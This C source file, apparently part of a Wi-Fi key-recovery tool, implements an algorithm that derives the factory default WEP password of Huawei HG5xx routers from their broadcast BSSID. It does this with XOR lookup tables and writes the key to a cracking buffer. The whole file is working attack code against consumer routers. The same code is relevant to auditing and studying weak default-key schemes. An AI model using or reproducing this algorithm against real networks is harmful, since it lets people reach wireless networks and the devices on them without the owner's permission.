/*********************************************************************************
 * Copyright (c) 2009, Chema Garcia                                              *
 * All rights reserved.                                                          *
 *                                                                               *
 * Redistribution and use in source and binary forms, with or                    *
 * without modification, are permitted provided that the following               *
 * conditions are met:                                                           *
 *                                                                               *
 *    * Redistributions of source code must retain the above                     *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer.                                                              *
 *                                                                               *
 *    * Redistributions in binary form must reproduce the above                  *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer in the documentation and/or other materials provided          *
 *      with the distribution.                                                   *
 *                                                                               *
 *    * Neither the name of the SafetyBits nor the names of its contributors may *
 *      be used to endorse or promote products derived from this software        *
 *      without specific prior written permission.                               *
 *                                                                               *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"   *
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE     *
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE    *
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE     *
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR           *
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF          *
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS      *
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN       *
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)       *
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE    *
 * POSSIBILITY OF SUCH DAMAGE.                                                   *
 *********************************************************************************/

#include <string.h>

#include "includes/algorithms.h"
#include "algorithms/huawei.h"

static const unsigned int a0[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
static const unsigned int a1[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
static const unsigned int a2[] = {0, 13, 10, 7, 5, 8, 15, 2, 10, 7, 0, 13, 15, 2, 5, 8};
static const unsigned int a3[] = {0, 1, 3, 2, 7, 6, 4, 5, 15, 14, 12, 13, 8, 9, 11, 10};
static const unsigned int a4[] = {0, 5, 11, 14, 7, 2, 12, 9, 15, 10, 4, 1, 8, 13, 3, 6};
static const unsigned int a5[] = {0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12};
static const unsigned int a6[] = {0, 1, 3, 2, 6, 7, 5, 4, 12, 13, 15, 14, 10, 11, 9, 8};
static const unsigned int a7[] = {0, 8, 0, 8, 1, 9, 1, 9, 2, 10, 2, 10, 3, 11, 3, 11};
static const unsigned int a8[] = {0, 5, 11, 14, 6, 3, 13, 8, 12, 9, 7, 2, 10, 15, 1, 4};
static const unsigned int a9[] = {0, 9, 2, 11, 5, 12, 7, 14, 10, 3, 8, 1, 15, 6, 13, 4};
static const unsigned int a10[] = {0, 14, 13, 3, 11, 5, 6, 8, 6, 8, 11, 5, 13, 3, 0, 14};
static const unsigned int a11[] = {0, 12, 8, 4, 1, 13, 9, 5, 2, 14, 10, 6, 3, 15, 11, 7};
static const unsigned int a12[] = {0, 4, 9, 13, 2, 6, 11, 15, 4, 0, 13, 9, 6, 2, 15, 11};
static const unsigned int a13[] = {0, 8, 1, 9, 3, 11, 2, 10, 6, 14, 7, 15, 5, 13, 4, 12};
static const unsigned int a14[] = {0, 1, 3, 2, 7, 6, 4, 5, 14, 15, 13, 12, 9, 8, 10, 11};
static const unsigned int a15[] = {0, 1, 3, 2, 6, 7, 5, 4, 13, 12, 14, 15, 11, 10, 8, 9};
static const unsigned int n1[] = {0, 14, 10, 4, 8, 6, 2, 12, 0, 14, 10, 4, 8, 6, 2, 12};
static const unsigned int n2[] = {0, 8, 0, 8, 3, 11, 3, 11, 6, 14, 6, 14, 5, 13, 5, 13};
static const unsigned int n3[] = {0, 0, 3, 3, 2, 2, 1, 1, 4, 4, 7, 7, 6, 6, 5, 5};
static const unsigned int n4[] = {0, 11, 12, 7, 15, 4, 3, 8, 14, 5, 2, 9, 1, 10, 13, 6};
static const unsigned int n5[] = {0, 5, 1, 4, 6, 3, 7, 2, 12, 9, 13, 8, 10, 15, 11, 14};
static const unsigned int n6[] = {0, 14, 4, 10, 11, 5, 15, 1, 6, 8, 2, 12, 13, 3, 9, 7};
static const unsigned int n7[] = {0, 9, 0, 9, 5, 12, 5, 12, 10, 3, 10, 3, 15, 6, 15, 6};
static const unsigned int n8[] = {0, 5, 11, 14, 2, 7, 9, 12, 12, 9, 7, 2, 14, 11, 5, 0};
static const unsigned int n9[] = {0, 0, 0, 0, 4, 4, 4, 4, 0, 0, 0, 0, 4, 4, 4, 4};
static const unsigned int n10[] = {0, 8, 1, 9, 3, 11, 2, 10, 5, 13, 4, 12, 6, 14, 7, 15};
static const unsigned int n11[] = {0, 14, 13, 3, 9, 7, 4, 10, 6, 8, 11, 5, 15, 1, 2, 12};
static const unsigned int n12[] = {0, 13, 10, 7, 4, 9, 14, 3, 10, 7, 0, 13, 14, 3, 4, 9};
static const unsigned int n13[] = {0, 1, 3, 2, 6, 7, 5, 4, 15, 14, 12, 13, 9, 8, 10, 11};
static const unsigned int n14[] = {0, 1, 3, 2, 4, 5, 7, 6, 12, 13, 15, 14, 8, 9, 11, 10};
static const unsigned int n15[] = {0, 6, 12, 10, 9, 15, 5, 3, 2, 4, 14, 8, 11, 13, 7, 1};
static const unsigned int n16[] = {0, 11, 6, 13, 13, 6, 11, 0, 11, 0, 13, 6, 6, 13, 0, 11};
static const unsigned int n17[] = {0, 12, 8, 4, 1, 13, 9, 5, 3, 15, 11, 7, 2, 14, 10, 6};
static const unsigned int n18[] = {0, 12, 9, 5, 2, 14, 11, 7, 5, 9, 12, 0, 7, 11, 14, 2};
static const unsigned int n19[] = {0, 6, 13, 11, 10, 12, 7, 1, 5, 3, 8, 14, 15, 9, 2, 4};
static const unsigned int n20[] = {0, 9, 3, 10, 7, 14, 4, 13, 14, 7, 13, 4, 9, 0, 10, 3};
static const unsigned int n21[] = {0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15};
static const unsigned int n22[] = {0, 1, 2, 3, 5, 4, 7, 6, 11, 10, 9, 8, 14, 15, 12, 13};
static const unsigned int n23[] = {0, 7, 15, 8, 14, 9, 1, 6, 12, 11, 3, 4, 2, 5, 13, 10};
static const unsigned int n24[] = {0, 5, 10, 15, 4, 1, 14, 11, 8, 13, 2, 7, 12, 9, 6, 3};
static const unsigned int n25[] = {0, 11, 6, 13, 13, 6, 11, 0, 10, 1, 12, 7, 7, 12, 1, 10};
static const unsigned int n26[] = {0, 13, 10, 7, 4, 9, 14, 3, 8, 5, 2, 15, 12, 1, 6, 11};
static const unsigned int n27[] = {0, 4, 9, 13, 2, 6, 11, 15, 5, 1, 12, 8, 7, 3, 14, 10};
static const unsigned int n28[] = {0, 14, 12, 2, 8, 6, 4, 10, 0, 14, 12, 2, 8, 6, 4, 10};
static const unsigned int n29[] = {0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3};
static const unsigned int n30[] = {0, 15, 14, 1, 12, 3, 2, 13, 8, 7, 6, 9, 4, 11, 10, 5};
static const unsigned int n31[] = {0, 10, 4, 14, 9, 3, 13, 7, 2, 8, 6, 12, 11, 1, 15, 5};
static const unsigned int n32[] = {0, 10, 5, 15, 11, 1, 14, 4, 6, 12, 3, 9, 13, 7, 8, 2};
static const unsigned int n33[] = {0, 4, 9, 13, 3, 7, 10, 14, 7, 3, 14, 10, 4, 0, 13, 9};
static const unsigned int key[] = {30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 61, 62, 63, 64, 65, 66};

void huawei_pwd ( struct crackdata *crack , unsigned int pattern )
{
    register unsigned int   byte = 0;
    unsigned int            hbssid[12];
    size_t                  ocupado = 0;
    char                    pwd[PASSWD_LEN] = {0};
    size_t                  len = PASSWD_LEN;
    unsigned char           *tmp;

    if ( pattern != HUAWEI_MODEL_HG5XX )
        return;

    memset ( hbssid , 0 , sizeof ( hbssid ) );
    sscanf ( crack->net->bssid, "%01x%01x:%01x%01x:%01x%01x:%01x%01x:%01x%01x:%01x%01x" , &hbssid[0], &hbssid[1], &hbssid[2], &hbssid[3], &hbssid[4], &hbssid[5], &hbssid[6], &hbssid[7], &hbssid[8], &hbssid[9], &hbssid[10], &hbssid[11] );

    /* primer par de bytes */
    byte = a2[hbssid[0]];
    byte ^= n11[hbssid[1]];
    byte ^= a7[hbssid[2]];
    byte ^= a8[hbssid[3]];
    byte ^= a14[hbssid[4]];
    byte ^= a5[hbssid[5]];
    byte ^= a5[hbssid[6]];
    byte ^= a2[hbssid[7]];
    byte ^= a0[hbssid[8]];
    byte ^= a1[hbssid[9]];
    byte ^= a15[hbssid[10]];
    byte ^= a0[hbssid[11]];
    byte ^= 0x0D; //WEP Base
    snprintf ( &pwd[ocupado] , len - ocupado , "%d" , key[byte] );
    ocupado += 2;

    /* segundo par de bytes */
    byte = n5[hbssid[0]];
    byte ^= n12[hbssid[1]];
    byte ^= a5[hbssid[2]];
    byte ^= a7[hbssid[3]];
    byte ^= a2[hbssid[4]];
    byte ^= a14[hbssid[5]];
    byte ^= a1[hbssid[6]];
    byte ^= a5[hbssid[7]];
    byte ^= a0[hbssid[8]];
    byte ^= a0[hbssid[9]];
    byte ^= n31[hbssid[10]];
    byte ^= a15[hbssid[11]];
    byte ^= 0x04; //WEP Base
    snprintf ( &pwd[ocupado] , len - ocupado , "%d" , key[byte] );
    ocupado += 2;

    /* tercer par de bytes */
    byte = a3[hbssid[0]];
    byte ^= a5[hbssid[1]];
    byte ^= a2[hbssid[2]];
    byte ^= a10[hbssid[3]];
    byte ^= a7[hbssid[4]];
    byte ^= a8[hbssid[5]];
    byte ^= a14[hbssid[6]];
    byte ^= a5[hbssid[7]];
    byte ^= a5[hbssid[8]];
    byte ^= a2[hbssid[9]];
    byte ^= a0[hbssid[10]];
    byte ^= a1[hbssid[11]];
    byte ^= 0x07; //WEP Base
    snprintf ( &pwd[ocupado] , len - ocupado , "%d" , key[byte] );
    ocupado += 2;

    /* cuarto par de bytes */
    byte = n6[hbssid[0]];
    byte ^= n13[hbssid[1]];
    byte ^= a8[hbssid[2]];
    byte ^= a2[hbssid[3]];
    byte ^= a5[hbssid[4]];
    byte ^= a7[hbssid[5]];
    byte ^= a2[hbssid[6]];
    byte ^= a14[hbssid[7]];
    byte ^= a1[hbssid[8]];
    byte ^= a5[hbssid[9]];
    byte ^= a0[hbssid[10]];
    byte ^= a0[hbssid[11]];
    byte ^= 0x0E; //WEP Base
    snprintf ( &pwd[ocupado] , len - ocupado , "%d" , key[byte] );
    ocupado += 2;

    /* quinto par de bytes */
    byte = n7[hbssid[0]];
    byte ^= n14[hbssid[1]];
    byte ^= a3[hbssid[2]];
    byte ^= a5[hbssid[3]];
    byte ^= a2[hbssid[4]];
    byte ^= a10[hbssid[5]];
    byte ^= a7[hbssid[6]];
    byte ^= a8[hbssid[7]];
    byte ^= a14[hbssid[8]];
    byte ^= a5[hbssid[9]];
    byte ^= a5[hbssid[10]];
    byte ^= a2[hbssid[11]];
    byte ^= 0x07; //WEP Base
    snprintf ( &pwd[ocupado] , len - ocupado , "%d" , key[byte] );
    ocupado += 2;

    tmp = (unsigned char*) strdup ( (char*) pwd );
    cbuffer_write(crack->buffer,(void*)tmp);

    return;
}
